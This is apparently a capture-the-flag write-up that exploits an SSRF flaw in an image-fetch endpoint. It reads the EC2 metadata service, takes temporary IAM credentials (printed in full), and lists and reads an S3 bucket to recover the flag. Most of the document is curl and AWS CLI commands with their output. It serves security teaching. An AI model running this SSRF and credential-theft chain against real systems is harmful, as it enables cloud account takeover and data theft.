# S3cret Eraser

## Description

The real artifact isn’t the image.

Flag Format: hackzero{}

Challenge URL: `https://removebg.vitbctf.dev`

## Writeup

The page exposes two ways to submit input:

1. Upload a local file.
2. Fetch an image from a user supplied URL.

The second feature seemed sus because user controlled URLs often lead to SSRF so I looked at the js code:

```javascript
async function fetchFromUrl() {
    const url = document.getElementById('url-input').value;
    if (!url) return;

    const response = await fetch('/fetch', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url })
    });

    const data = await response.json();
    if (data.success) {
        displayResult(data.s3Url);
    }
}
```

The frontend sends a JSON body containing a raw `url` to `/fetch`. But we still don't know what the backend does with that URL so I fired up a few more requests.

First, confirm normal behavior by supplying a valid public image URL:

```bash
curl "https://removebg.vitbctf.dev/fetch" -H "Content-Type: application/json" --data '{"url":"https://www.techsyndicate.us/tsLogo.svg"}'
```

```json
{"success":true,"s3Url":"https://bg-remove-ctf-93f2a8.s3.ap-south-1.amazonaws.com/processed/url-1774842966077.png"}
```

So the server fetches the remote content, processes it and stores the result in an S3 bucket.

Next, testing the endpoint with a non image resource:

```bash
curl "https://removebg.vitbctf.dev/fetch" -H "Content-Type: application/json" --data '{"url":"http://example.com/"}'
```

```json
{
  "success": false,
  "error": "Fetched content is not an image.",
  "content": "<!doctype html><html lang=\"en\"><head><title>Example Domain</title>..." // truncated for conciseness
}
```

This is the vulnerability. The backend is not just fetching arbitrary URLs, it is also reflecting the fetched response body back to the client when the content is not an image. That means the endpoint can be used as a read primitive against internal HTTP services.

If the challenge backend is hosted on EC2 and the server is allowed to make outbound requests there, the metadata service (169.254.169.254) should be reachable only from the instance itself. A vulnerable SSRF endpoint can bridge that gap.

Probe the metadata root:

```bash
curl "https://removebg.vitbctf.dev/fetch" -H "Content-Type: application/json" --data '{"url":"http://169.254.169.254/latest/meta-data/"}'
```

```json
{
  "success": false,
  "error": "Fetched content is not an image.",
  "content": "ami-id\nami-launch-index\nami-manifest-path\nblock-device-mapping/\nevents/\nhostname\niam/\nidentity-credentials/\ninstance-action\ninstance-id\ninstance-life-cycle\ninstance-type\nlocal-hostname\nlocal-ipv4\nmac\nmanaged-ssh-keys/\nmetrics/\nnetwork/\nplacement/\nprofile\npublic-hostname\npublic-ipv4\npublic-keys/\nreservation-id\nsecurity-groups\nservices/\nsystem"
}
```

That confirms SSRF to the EC2 metadata service. Now it's just me running a lot of commands finding infoz:

```bash
curl "https://removebg.vitbctf.dev/fetch" -H "Content-Type: application/json" --data '{"url":"http://169.254.169.254/latest/dynamic/instance-identity/document"}'
```

```json
{
  // truncated for conciseness
  "accountId" : "752948842220",
  "architecture" : "x86_64",
  "availabilityZone" : "ap-south-1b",
  "imageId" : "ami-05d2d839d4f73aafb",
  "instanceId" : "i-0c23ce7ecf755d294",
  "instanceType" : "t2.small",
  "privateIp" : "172.31.11.25",
  "region" : "ap-south-1",
  "version" : "2017-09-30"
}
```

AWS EC2 app in region `ap-south-1` under account `752948842220`. Next, I found the attached IAM role name:

```bash
curl "https://removebg.vitbctf.dev/fetch" -H "Content-Type: application/json" --data '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

```json
{
  "success": false,
  "error": "Fetched content is not an image.",
  "content": "bg-remove-all"
}
```

Now requesting credentials for that `bg-remove-all` role:

```bash
curl "https://removebg.vitbctf.dev/fetch" -H "Content-Type: application/json" --data '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/bg-remove-all"}'
```

```json
{
  // truncated for conciseness
  "Code" : "Success",
  "LastUpdated" : "2026-03-29T06:14:34Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA26TZ7R3WLZ3BGFOR",
  "SecretAccessKey" : "RCxfKDwZbell7vYbWuNc5hTMVRF78TeZRLljmjNf",
  "Token" : "<redacted in writeup for readability>",
  "Expiration" : "2026-03-29T12:36:31Z"
}
```

These are temporary STS credentials attached to the instance profile with which the backend's AWS permissions can be used directly which we can confirm by:

```bash
curl "https://removebg.vitbctf.dev/fetch" -H "Content-Type: application/json" --data '{"url":"http://169.254.169.254/latest/meta-data/iam/info"}'
```

```json
{
  // truncated for conciseness
  "Code" : "Success",
  "LastUpdated" : "2026-03-29T06:14:15Z",
  "InstanceProfileArn" : "arn:aws:iam::752948842220:instance-profile/bg-remove-all",
  "InstanceProfileId" : "AIPA26TZ7R3WG5XSEWLV6"
}
```

We got the bucket name `bg-remove-ctf-93f2a8` from the past response:

```json
{"success":true,"s3Url":"https://bg-remove-ctf-93f2a8.s3.ap-south-1.amazonaws.com/processed/url-123456not789.png"}
```

Using the stolen credentials with the AWS CLI we first list the bucket contents:

```bash
AWS_ACCESS_KEY_ID="ASIA26TZ7R3WLZ3BGFOR"
AWS_SECRET_ACCESS_KEY="RCxfKDwZbell7vYbWuNc5hTMVRF78TeZRLljmjNf"
AWS_SESSION_TOKEN="<session-token>"
AWS_DEFAULT_REGION="ap-south-1"
```

```bash
aws s3 ls "s3://bg-remove-ctf-93f2a8"
```

```text
                           PRE processed/
                           PRE supersecret/
```

`processed/` is expected from the app workflow unlike `supersecret/` which is clearly holding the flag so enumerating it:

```bash
aws s3 ls "s3://bg-remove-ctf-93f2a8/supersecret/" --recursive
```

```text
2026-03-25 23:00:19          0 supersecret/
2026-03-25 23:02:03         42 supersecret/flag.txt
```

Now we do the hardest part, reading the flag:

```bash
curl "https://bg-remove-ctf-93f2a8.s3.ap-south-1.amazonaws.com/supersecret/flag.txt"
```

## Flag

`hackzero{14a1f61b47251e394accb4e580e00b77}`
